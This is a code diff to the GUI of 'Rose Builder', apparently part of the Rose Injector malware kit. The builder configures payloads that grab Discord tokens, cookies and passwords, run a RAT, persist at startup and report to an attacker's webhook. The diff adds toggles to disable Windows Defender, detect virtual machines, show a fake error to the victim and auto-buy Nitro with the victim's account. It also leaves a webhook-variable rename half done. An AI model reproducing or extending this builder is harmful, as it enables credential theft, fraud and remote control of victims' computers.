@@ -28,7 +28,7 @@ __debugm__ = False #Change if you would like to be in a debug mode, actually onl
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/roseui/msg.txt").text.splitlines()[0].split(" - ")
 
 xstartup = False 
-xinjections = False
+xinjection = False
 xtoken = False 
 xcookie = False 
 xpassword = False 
@@ -39,7 +39,12 @@ xrat = False
 xscreenshot = False
 xraturl = ""
 xping = False
-xwehookurl = ""
+xfakeerror = False
+xnitrobuy = False
+xdefenderfucker = False
+xvmdetect = False
+xwebhookurl = ""
+xvmwebhookurl = ""
 xbuildname = ""
 
 xprogressvalue = False
@@ -68,6 +73,41 @@ def auto_update():
             os.startfile(__file__)
             os._exit(0)
 
+def change_fakeerror():
+    global xfakeerror
+    xfakeerror = not xfakeerror
+    if xfakeerror:
+        ui.notify("Fake Error has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
+        return
+    ui.notify("Fake Error has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
+
+def change_nitrobuy():
+    global xnitrobuy
+    xnitrobuy = not xnitrobuy
+    if xnitrobuy:
+        ui.notify("Nitro Auto Buy has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
+        return 
+    ui.notify("Nitro Auto Buy has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
+
+def change_defenderfucker():
+    global xdefenderfucker
+    xdefenderfucker = not xdefenderfucker
+    if xdefenderfucker:
+        ui.notify("Windows Defender Fucker has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
+        return 
+    ui.notify("Windows Defender Fucker has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
+
+def change_vmdetect():
+    global xvmdetect
+    xvmdetect = not xvmdetect
+    if xvmdetect:
+        ui.notify("VM Detection has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
+        return 
+    ui.notify("VM Detection has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
+
+def change_vmwebhookurl(value):
+    global xvmwebhookurl
+    xvmwebhookurl = value
 
 def change_startups():
     global xstartup
@@ -77,10 +117,10 @@ def change_startups():
         return 
     ui.notify("Startup has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
 
-def change_injections():
-    global xinjections
-    xinjections = not xinjections
-    if xinjections:
+def change_injection():
+    global xinjection
+    xinjection = not xinjection
+    if xinjection:
         ui.notify("Injection has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
         return
     ui.notify("Injection has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
@@ -160,7 +200,7 @@ def change_pings():
         return
     ui.notify("Ping has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
 
-def change_wehookurl(value):
+def change_webhookurl(value):
     global xwehookurl
     xwehookurl = value
 
@@ -188,7 +228,7 @@ async def test_webhook(webhook_url):
                 timestamp="now"
             )
             embed.set_author(name="Success", icon_url=__icon__)
-            embed.set_footer(text="Rose Builder | By pierro, suegdu, S1LKT0UCH, svn", icon_url=__icon__)
+            embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
             await hook.send(embed=embed)
         return 0
     except Exception as e:
@@ -201,13 +241,17 @@ def __build():
     print(path)
     if xraturl == "":
         xraturl = ".rat"
-    msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjections} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping}"
+    msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjection} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping} {xvmdetect} {xvmwebhookurl} {xfakeerror} {xnitrobuy} {xdefenderfucker}"
     os.system(msg)
 
 def _makebuild():
     if xwehookurl == "":
         ui.notify("WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
-        return 
+        return
+    if xvmdetect:
+        if xvmwebhookurl == "":
+            ui.notify("VM Detection WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+            return
     if xbuildname == "":
         ui.notify("Build Name is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
@@ -223,7 +267,7 @@ def _home():
     with ui.column():
         #with ui.expansion('Infos', icon='star_rate').classes('w-full'):
         ui.input(label='WebHook URL', placeholder='Rose on top baby',
-                on_change=lambda e: change_wehookurl(e.value)).props('inline color=pink-3').classes('w-full')
+                on_change=lambda e: change_webhookurl(e.value)).props('inline color=pink-3').classes('w-full')
         ui.input(label='Build Name', placeholder='Rose on top baby',
                 on_change=lambda e: change_buildname(e.value)).props('inline color=pink-3').classes('w-full')
         ui.button('Test WebHook', on_click=_test_webhook).props("icon=code color=purple-11").classes('w-full')
@@ -235,7 +279,8 @@ def _functions():
     with ui.column():
         with ui.expansion('System', icon='work').classes('w-full'):
             ui.checkbox('Startup', on_change=change_startups).props('inline color=pink')
-            ui.checkbox('Injector', on_change=change_injections).props('inline color=pink')
+            ui.checkbox('Injector', on_change=change_injection).props('inline color=pink')
+            ui.checkbox('Defender Fucker', on_change=change_defenderfucker).props('inline color=pink')
 
         with ui.expansion('Grabber', icon='work').classes('w-full'):
             with ui.row():
@@ -257,6 +302,12 @@ def _functions():
                     ui.input(label='RAT Server URL', placeholder='Rose on top baby',
                         on_change=lambda e: change_ratsurl(e.value)).bind_visibility_from(_rat, 'value').props('inline color=yellow-7')
                 ui.checkbox('Ping', on_change=change_pings).props('inline color=yellow-7')
+                ui.checkbox('Fake Error', on_change=change_fakeerror).props('inline color=yellow-7')
+                ui.checkbox('Nitro Auto Buy', on_change=change_nitrobuy).props('inline color=yellow-7')
+                with ui.row():
+                    _vm = ui.checkbox('VM', on_change=change_vmdetect).props('inline color=yellow-7')
+                    ui.input(label='VM Detection WebHook URL', placeholder='Rose on top baby',
+                        on_change=lambda e: change_vmwebhookurl(e.value)).bind_visibility_from(_vm, 'value').props('inline color=yellow-7')
 
 
 def _github():
@@ -266,16 +317,16 @@ def _github():
             with ui.row():
                 with ui.card_section():
                     ui.label("xpierroz").classes("text-h6")
-                    ui.markdown('<em>- "S1LKY MAKE A FUCKING PR"</em>').classes("text-subtitle5")
+                    ui.markdown('<em>- "GUMBO MAKE A FUCKING PR"</em>').classes("text-subtitle5")
                     with ui.row():
                         #ui.label(" ") # Because the button are so sticked together without (sex button) - xpierroz 03/24
                         ui.button(on_click=psocials.open_xpierroz).props("round icon=code color=blue-11")
                         ui.button(on_click=psocials.open_xpierroz_insta).props("round icon=star_rate color=amber-8")
 
                 with ui.card_section():
-                    ui.label("S1LKT0UCH").classes("text-h6")
+                    ui.label("Gumbobrot").classes("text-h6")
                     ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
-                    ui.button(on_click=psocials.open_S1LKT0UCH).props("round icon=code color=blue-11")
+                    ui.button(on_click=psocials.open_Gumbobrot).props("round icon=code color=blue-11")
 
             with ui.row():               
                 with ui.card_section():
